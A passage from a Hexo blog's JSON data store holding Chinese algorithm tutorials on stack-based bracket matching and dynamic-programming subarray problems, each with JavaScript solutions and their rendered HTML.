则把对应的索引压入栈 <code>stack</code> 中</li>\n<li>如果遇到 <code>)</code> 则进行一下判断<ol>\n<li>如果当前栈为空，说明已匹配完成，将 <code>start</code> 设置为 <code>i + 1</code></li>\n<li>如果当前栈不为空，则<strong>取出栈顶元素</strong>，并再进行下一步判断<ol>\n<li>如果此时栈为空，说明取出后刚好匹配完成，将 <code>res</code> 设置为 <code>Math.max(res, i - start + 1)</code>;</li>\n<li>如果此时栈不为空，说明指匹配到了部分元素，将 <code>res</code> 设置为 <code>Math.max(res, i - stack.top())</code></li>\n</ol>\n</li>\n</ol>\n</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> longestValidParentheses = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">s</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> stack = [];</span><br><span class=\"line\">  <span class=\"keyword\">let</span> res = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> start = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; s.length; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (s[i] === <span class=\"string\">&#x27;(&#x27;</span>) &#123;</span><br><span class=\"line\">      stack.push(i);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (s[i] === <span class=\"string\">&#x27;)&#x27;</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (stack.length === <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        start = i + <span class=\"number\">1</span>;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        stack.pop();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (stack.length === <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">          res = <span class=\"built_in\">Math</span>.max(res, i - start + <span class=\"number\">1</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">          res = <span class=\"built_in\">Math</span>.max(res, i - stack[stack.length - <span class=\"number\">1</span>]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"技巧篇-栈结构\"><a href=\"#技巧篇-栈结构\" class=\"headerlink\" title=\"技巧篇 - 栈结构\"></a>技巧篇 - 栈结构</h1><h3 id=\"判断是否有有效的括号\"><a href=\"#判断是否有有效的括号\" class=\"headerlink\" title=\"判断是否有有效的括号\"></a>判断是否有有效的括号</h3><p><strong>问题：</strong>给定一个只包括 ‘(‘，’)’，’{‘，’}’，’[‘，’]’ 的字符串，判断字符串是否有效。</p>\n<p>有效字符串需满足：</p>\n<ul>\n<li>左括号必须用相同类型的右括号闭合。</li>\n<li>左括号必须以正确的顺序闭合。</li>\n<li>注意空字符串可被认为是有效字符串。</li>\n</ul>\n<p><strong>示例：</strong><br>输入: “()[]{}”<br>输出: true</p>\n<p>输入: “([)]”<br>输出: false</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> isValid = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">s</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> stack = [];</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; s.length; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> char = s[i];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ([<span class=\"string\">&#x27;(&#x27;</span>, <span class=\"string\">&#x27;&#123;&#x27;</span>, <span class=\"string\">&#x27;[&#x27;</span>].indexOf(char) &gt; -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">      stack.push(char);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!stack.length) <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">const</span> top = stack.pop();</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (top === <span class=\"string\">&#x27;(&#x27;</span> &amp;&amp; char !== <span class=\"string\">&#x27;)&#x27;</span>) <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (top === <span class=\"string\">&#x27;[&#x27;</span> &amp;&amp; char !== <span class=\"string\">&#x27;]&#x27;</span>) <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (top === <span class=\"string\">&#x27;&#123;&#x27;</span> &amp;&amp; char !== <span class=\"string\">&#x27;&#125;&#x27;</span>) <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> stack.length === <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"有效括号的子串的最大长度\"><a href=\"#有效括号的子串的最大长度\" class=\"headerlink\" title=\"有效括号的子串的最大长度\"></a>有效括号的子串的最大长度</h3><p><strong>问题：</strong>给定一个只包含 ‘(‘ 和 ‘)’ 的字符串，找出最长的包含有效括号的子串的长度。</p>\n<p><strong>示例：</strong><br>输入: “(()”<br>输出: 2<br>解释: 最长有效括号子串为 “()”</p>\n<p>输入: “)()())”<br>输出: 4<br>解释: 最长有效括号子串为 “()()”</p>\n<p><strong>思路：</strong></p>\n<ol>\n<li>遍历整个字符串，res 保存遍历过程中满足条件的最大值，start 表示为起始位置</li>\n<li>如果遇到 <code>(</code> 则把对应的索引压入栈 <code>stack</code> 中</li>\n<li>如果遇到 <code>)</code> 则进行一下判断<ol>\n<li>如果当前栈为空，说明已匹配完成，将 <code>start</code> 设置为 <code>i + 1</code></li>\n<li>如果当前栈不为空，则<strong>取出栈顶元素</strong>，并再进行下一步判断<ol>\n<li>如果此时栈为空，说明取出后刚好匹配完成，将 <code>res</code> 设置为 <code>Math.max(res, i - start + 1)</code>;</li>\n<li>如果此时栈不为空，说明指匹配到了部分元素，将 <code>res</code> 设置为 <code>Math.max(res, i - stack.top())</code></li>\n</ol>\n</li>\n</ol>\n</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> longestValidParentheses = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">s</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> stack = [];</span><br><span class=\"line\">  <span class=\"keyword\">let</span> res = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> start = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; s.length; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (s[i] === <span class=\"string\">&#x27;(&#x27;</span>) &#123;</span><br><span class=\"line\">      stack.push(i);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (s[i] === <span class=\"string\">&#x27;)&#x27;</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (stack.length === <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        start = i + <span class=\"number\">1</span>;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        stack.pop();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (stack.length === <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">          res = <span class=\"built_in\">Math</span>.max(res, i - start + <span class=\"number\">1</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">          res = <span class=\"built_in\">Math</span>.max(res, i - stack[stack.length - <span class=\"number\">1</span>]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>"},{"title":"技巧篇 - 动态规划 - 求子数组的最值问题","date":"2021-05-24T08:32:28.000Z","_content":"\n# 技巧篇 - 动态规划 - 求子数组的最值问题\n\n### 1. 子数组和最大\n\n描述：给定一个整数数组 nums ，找到一个具有最大和的连续子数组（子数组最少包含一个元素），返回其最大和。\n\n示例:\n> 输入: [-2,1,-3,4,-1,2,1,-5,4],\n> 输出: 6\n> 解释: 连续子数组 [4,-1,2,1] 的和最大，为 6。\n\n**解题思路**：\n假设 `max[i]` 为 `nums` 前 `i` 个数字中*包含数字 `num[i]`* 的最大值，则 `max[i]` 必定是由 `Math.max(max[i-1] + nums[i], nums[i])` 得到，遍历数组依次可得到包含 `num[i]` 的子数组的最大值， (`i` 从 `0 ~ n-1`)，取这些最大值里面最大的一个即为结果。\n\n```js\nvar maxSubArray = function(nums) {\n\n  if (!nums.length) return 0;\n\n  let max = nums[0];\n  let res = max;\n\n  for (let i = 1; i < nums.length; i++) {\n    max = Math.max(nums[i], max + nums[i]);\n    res = Math.max(max, res);\n  }\n\n  return res;\n};\n```\n\n### 2. 子数组乘积最大\n\n描述：给定一个整数数组 nums ，请你找出数组中乘积最大的连续子数组（该子数组中至少包含一个数字）。\n\n示例 1:\n> 输入: [3]\n> 输出: 3\n> 解释: 子数组 [3] 有最大乘积 3。\n\n示例 1:\n> 输入: [2,3,-2,4]\n> 输出: 6\n> 解释: 子数组 [2,3] 有最大乘积 6。\n\n示例 2:\n> 输入: [-2,0,-1]\n> 输出: 0\n> 解释: 结果不能为 2, 因为 [-2,-1] 不是子数组。\n\n**解题思路**：\n假设 `max[i]`、`min[i]` 分别为 `nums` 前 `i` 个数字中*包含数字 `i`* 的最大值和最小值，则 `max[i]`、`min[i]` 必定是由以下方式得到的：\n1. `nums[i] >= 0`, 则是由 `Math.max(nums[i], max[i - 1] *  nums[i])` 得到\n2. `nums[i] < 0`, 则是由 `Math.max(nums[i], min[i - 1] *  nums[i])` 得到\n3. 由此可得到包含数字 `num[i]` 为子数组的最大值，然后取 *max[0]* ~ *max[n - 1]* 的最大值\n\n\n```js\n// 解法 1\nvar maxProduct = function(nums) {\n  if (!nums.length) return 0;\n  \n  let max = nums[0];\n  let min = nums[0];\n  let res = max;\n\n  for (let i = 1; i < nums.length; i++) {\n    let tempMax = max; \n    let tempMin = min;\n    max = Math.max(Math.max(nums[i], tempMax * nums[i]), tempMin * nums[i]);\n    min = Math.min(Math.min(nums[i], tempMax * nums[i]), tempMin * nums[i]);\n    res = Math.max(max, res);\n  }\n\n  return res;\n};\n\n\n\n// 解法 2\nvar maxProduct = function(nums) {\n  if (!nums.length) return 0;\n\n  let max = nums[0];\n  let min = nums[0];\n  let res = max;\n\n  for (let i = 1; i < nums.length; i++) {\n    if (nums[i] >= 0) {\n      max = Math.max(nums[i], max * nums[i]);\n      min = Math.min(nums[i], min * nums[i]);\n    } else if (nums[i] < 0) {\n      let tempMax = max;\n      max = Math.max(nums[i], min * nums[i]);\n      min = Math.min(nums[i], tempMax * nums[i]);\n    }\n    res = Math.max(max, res);\n  }\n\n  return res;\n};\n\n// 解法 3\nvar maxProduct = function(nums) {\n  if (!nums.length) return 0;\n\n  let max = nums[0];\n  let min = nums[0];\n  let res = max;\n\n  for (let i = 1; i < nums.length; i++) {\n    if (nums[i] < 0) {\n      let temp = max;\n      max = min;\n      min = temp;\n    }\n\n    max = Math.max(nums[i], max * nums[i]);\n    min = Math.min(nums[i], min * nums[i]);\n    res = Math.max(max, res);\n  }\n\n  return res;\n};\n```\n\n### 3. 除自身以外数组的乘积\n\n描述：给你一个长度为 n 的整数数组 nums，其中 n > 1，返回输出数组 output ，其中 output[i] 等于 nums 中除 nums[i] 之外其余各元素的乘积。\n\n示例:\n> 输入: [1,2,3,4]\n> 输出: [24,12,8,6]\n\n**解题思路**：\n1. 从左向右遍历作累乘处理，则 `leftProducet[i]` 表示前 i 个数字相乘的积\n2. 从右向左遍历作累乘处理，则 `rightProducet[i]` 表示后 i 个数字相乘的积（不包括第 `i` 个数字）\n3. `res[i] = leftProducet[i] * rightProducet[i]` 表示除了第 `i` 个数字外的其他数字的乘积\n\n```js\nvar productExceptSelf = function(nums) {\n  let res = [];\n  let len = nums.length;\n  let leftProducet = [1];\n  let rightProducet = [];\n  rightProducet[len - 1] = 1;\n  \n  for (let i = 0; i < len; i++) {\n    leftProducet[i + 1] = leftProducet[i] * nums[i];\n  }\n  for (let i = len - 2; i >= 0; i--) {\n    rightProducet[i] = rightProducet[i + 1] * nums[i + 1];\n  }\n\n  for (let i = 0; i < len; i++) {\n    res[i] = leftProducet[i] * rightProducet[i];\n  }\n\n  return res;\n};\n```\n \n\n","source":"_posts/算法题/技巧篇 - 动态规划 - 求子数组的最值问题.md","raw":"---\ntitle: 技巧篇 - 动态规划 - 求子数组的最值问题\ncategories: 算法题\ntags: [算法题, 技巧篇]\ndate: 2021-05-24 16:32:28\n---\n\n# 技巧篇 - 动态规划 - 求子数组的最值问题\n\n### 1. 子数组和最大\n\n描述：给定一个整数数组 nums ，找到一个具有最大和的连续子数组（子数组最少包含一个元素），返回其最大和。\n\n示例:\n> 输入: [-2,1,-3,4,-1,2,1,-5,4],\n> 输出: 6\n> 解释: 连续子数组 [4,-1,2,1] 的和最大，为 6。\n\n**解题思路**：\n假设 `max[i]` 为 `nums` 前 `i` 个数字中*包含数字 `num[i]`* 的最大值，则 `max[i]` 必定是由 `Math.max(max[i-1] + nums[i], nums[i])` 得到，遍历数组依次可得到包含 `num[i]` 的子数组的最大值， (`i` 从 `0 ~ n-1`)，取这些最大值里面最大的一个即为结果。\n\n```js\nvar maxSubArray = function(nums) {\n\n  if (!nums.length) return 0;\n\n  let max = nums[0];\n  let res = max;\n\n  for (let i = 1; i < nums.length; i++) {\n    max = Math.max(nums[i], max + nums[i]);\n    res = Math.max(max, res);\n  }\n\n  return res;\n};\n```\n\n### 2. 子数组乘积最大\n\n描述：给定一个整数数组 nums ，请你找出数组中乘积最大的连续子数组（该子数组中至少包含一个数字）。\n\n示例 1:\n> 输入: [3]\n> 输出: 3\n> 解释: 子数组 [3] 有最大乘积 3。\n\n示例 1:\n> 输入: [2,3,-2,4]\n> 输出: 6\n> 解释: 子数组 [2,3] 有最大乘积 6。\n\n示例 2:\n> 输入: [-2,0,-1]\n> 输出: 0\n> 解释: 结果不能为 2, 因为 [-2,-1] 不是子数组。\n\n**解题思路**：\n假设 `max[i]`、`min[i]` 分别为 `nums` 前 `i` 个数字中*包含数字 `i`* 的最大值和最小值，则 `max[i]`、`min[i]` 必定是由以下方式得到的：\n1. `nums[i] >= 0`, 则是由 `Math.max(nums[i], max[i - 1] *  nums[i])` 得到\n2. `nums[i] < 0`, 则是由 `Math.max(nums[i], min[i - 1] *  nums[i])` 得到\n3. 由此可得到包含数字 `num[i]` 为子数组的最大值，然后取 *max[0]* ~ *max[n - 1]* 的最大值\n\n\n```js\n// 解法 1\nvar maxProduct = function(nums) {\n  if (!nums.length) return 0;\n  \n  let max = nums[0];\n  let min = nums[0];\n  let res = max;\n\n  for (let i = 1; i < nums.length; i++) {\n    let tempMax = max; \n    let tempMin = min;\n    max = Math.max(Math.max(nums[i], tempMax * nums[i]), tempMin * nums[i]);\n    min = Math.min(Math.min(nums[i], tempMax * nums[i]), tempMin * nums[i]);\n    res = Math.max(max, res);\n  }\n\n  return res;\n};\n\n\n\n// 解法 2\nvar maxProduct = function(nums) {\n  if (!nums.length) return 0;\n\n  let max = nums[0];\n  let min = nums[0];\n  let res = max;\n\n  for (let i = 1; i < nums.length; i++) {\n    if (nums[i] >= 0) {\n      max = Math.max(nums[i], max * nums[i]);\n      min = Math.min(nums[i], min * nums[i]);\n    } else if (nums[i] < 0) {\n      let tempMax = max;\n      max = Math.max(nums[i], min * nums[i]);\n      min = Math.min(nums[i], tempMax * nums[i]);\n    }\n    res = Math.max(max, res);\n  }\n\n  return res;\n};\n\n// 解法 3\nvar maxProduct = function(nums) {\n  if (!nums.length) return 0;\n\n  let max = nums[0];\n  let min = nums[0];\n  let res = max;\n\n  for (let i = 1; i < nums.length; i++) {\n    if (nums[i] < 0) {\n      let temp = max;\n      max = min;\n      min = temp;\n    }\n\n    max = Math.max(nums[i], max * nums[i]);\n    min = Math.min(nums[i], min * nums[i]);\n    res = Math.max(max, res);\n  }\n\n  return res;\n};\n```\n\n### 3. 除自身以外数组的乘积\n\n描述：给你一个长度为 n 的整数数组 nums，其中 n > 1，返回输出数组 output ，其中 output[i] 等于 nums 中除 nums[i] 之外其余各元素的乘积。\n\n示例:\n> 输入: [1,2,3,4]\n> 输出: [24,12,8,6]\n\n**解题思路**：\n1. 从左向右遍历作累乘处理，则 `leftProducet[i]` 表示前 i 个数字相乘的积\n2. 从右向左遍历作累乘处理，则 `rightProducet[i]` 表示后 i 个数字相乘的积（不包括第 `i` 个数字）\n3. `res[i] = leftProducet[i] * rightProducet[i]` 表示除了第 `i` 个数字外的其他数字的乘积\n\n```js\nvar productExceptSelf = function(nums) {\n  let res = [];\n  let len = nums.length;\n  let leftProducet = [1];\n  let rightProducet = [];\n  rightProducet[len - 1] = 1;\n  \n  for (let i = 0; i < len; i++) {\n    leftProducet[i + 1] = leftProducet[i] * nums[i];\n  }\n  for (let i = len - 2; i >= 0; i--) {\n    rightProducet[i] = rightProducet[i + 1] * nums[i + 1];\n  }\n\n  for (let i = 0; i < len; i++) {\n    res[i] = leftProducet[i] * rightProducet[i];\n  }\n\n  return res;\n};\n```\n \n\n","slug":"算法题/技巧篇 - 动态规划 - 求子数组的最值问题","published":1,"updated":"2021-06-07T10:02:02.047Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckpmga1yo000nok6r7h0ndud2","content":"<h1 id=\"技巧篇-动态规划-求子数组的最值问题\"><a href=\"#技巧篇-动态规划-求子数组的最值问题\" class=\"headerlink\" title=\"技巧篇 - 动态规划 - 求子数组的最值问题\"></a>技巧篇 - 动态规划 - 求子数组的最值问题</h1><h3 id=\"1-子数组和最大\"><a href=\"#1-子数组和最大\" class=\"headerlink\" title=\"1. 子数组和最大\"></a>1. 子数组和最大</h3><p>描述：给定一个整数数组 nums ，找到一个具有最大和的连续子数组（子数组最少包含一个元素），返回其最大和。</p>\n<p>示例:</p>\n<blockquote>\n<p>输入: [-2,1,-3,4,-1,2,1,-5,4],<br>输出: 6<br>解释: 连续子数组 [4,-1,2,1] 的和最大，为 6。</p>\n</blockquote>\n<p><strong>解题思路</strong>：<br>假设 <code>max[i]</code> 为 <code>nums</code> 前 <code>i</code> 个数字中<em>包含数字 <code>num[i]</code></em> 的最大值，则 <code>max[i]</code> 必定是由 <code>Math.max(max[i-1] + nums[i], nums[i])</code> 得到，遍历数组依次可得到包含 <code>num[i]</code> 的子数组的最大值， (<code>i</code> 从 <code>0 ~ n-1</code>)，取这些最大值里面最大的一个即为结果。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> maxSubArray = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">nums</span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!nums.length) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> max = nums[<span class=\"number\">0</span>];</span><br><span class=\"line\">  <span class=\"keyword\">let</span> res = max;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">1</span>; i &lt; nums.length; i++) &#123;</span><br><span class=\"line\">    max = <span class=\"built_in\">Math</span>.max(nums[i], max + nums[i]);</span><br><span class=\"line\">    res = <span class=\"built_in\">Math</span>.max(max, res);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-子数组乘积最大\"><a href=\"#2-子数组乘积最大\" class=\"headerlink\" title=\"2. 子数组乘积最大\"></a>2. 子数组乘积最大</h3><p>描述：给定一个整数数组 nums ，请你找出数组中乘积最大的连续子数组（该子数组中至少包含一个数字）。</p>\n<p>示例 1:</p>\n<blockquote>\n<p>输入: [3]<br>输出: 3<br>解释: 子数组 [3] 有最大乘积 3。</p>\n</blockquote>\n<p>示例 1:</p>\n<blockquote>\n<p>输入: [2,3,-2,4]<br>输出: 6<br>解释: 子数组 [2,3] 有最大乘积 6。</p>\n</blockquote>\n<p>示例 2:</p>\n<blockquote>\n<p>输入: [-2,0,-1]<br>输出: 0<br>解释: 结果不能为 2, 因为 [-2,-1] 不是子数组。</p>\n</blockquote>\n<p><strong>解题思路</strong>：<br>假设 <code>max[i]</code>、<code>min[i]</code> 分别为 <code>nums</code> 前 <code>i</code> 个数字中<em>包含数字 <code>i</code></em> 的最大值和最小值，则 <code>max[i]</code>、<code>min[i]</code> 必定是由以下方式得到的：</p>\n<ol>\n<li><code>nums[i] &gt;= 0</code>, 则是由 <code>Math.max(nums[i], max[i - 1] *  nums[i])</code> 得到</li>\n<li><code>nums[i] &lt; 0</code>, 则是由 <code>Math.max(nums[i], min[i - 1] *  nums[i])</code> 得到</li>\n<li>由此可得到包含数字 <code>num[i]</code> 为子数组的最大值，然后取 <em>max[0]</em> ~ <em>max[n - 1]</em> 的最大值</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 解法 1</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> maxProduct = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">nums</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!nums.length) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">let</span> max = nums[<span class=\"number\">0</span>];</span><br><span class=\"line\">  <span class=\"keyword\">let</span> min = nums[<span class=\"number\">0</span>];</span><br><span class=\"line\">  <span class=\"keyword\">let</span> res = max;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">1</span>; i &lt; nums.length; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> tempMax = max; </span><br><span class=\"line\">    <span class=\"keyword\">let</span> tempMin = min;</span><br><span class=\"line\">    max = <span class=\"built_in\">Math</span>.max(<span class=\"built_in\">Math</span>.max(nums[i], tempMax * nums[i]), tempMin * nums[i]);</span><br><span class=\"line\">    min = <span class=\"built_in\">Math</span>.min(<span class=\"built_in\">Math</span>.min(nums[i], tempMax * nums[i]), tempMin * nums[i]);</span><br><span class=\"line\">    res = <span class=\"built_in\">Math</span>.max(max, res);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 解法 2</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> maxProduct = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">nums</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!nums.length) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> max = nums[<span class=\"number\">0</span>];</span><br><span class=\"line\">  <span class=\"keyword\">let</span> min = nums[<span class=\"number\">0</span>];</span><br><span class=\"line\">  <span class=\"keyword\">let</span> res = max;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">1</span>; i &lt; nums.length; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (nums[i] &gt;= <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">      max = <span class=\"built_in\">Math</span>.max(nums[i], max * nums[i]);</span><br><span class=\"line\">      min = <span class=\"built_in\">Math</span>.min(nums[i], min * nums[i]);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (nums[i] &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">let</span> tempMax = max;</span><br><span class=\"line\">      max = <span 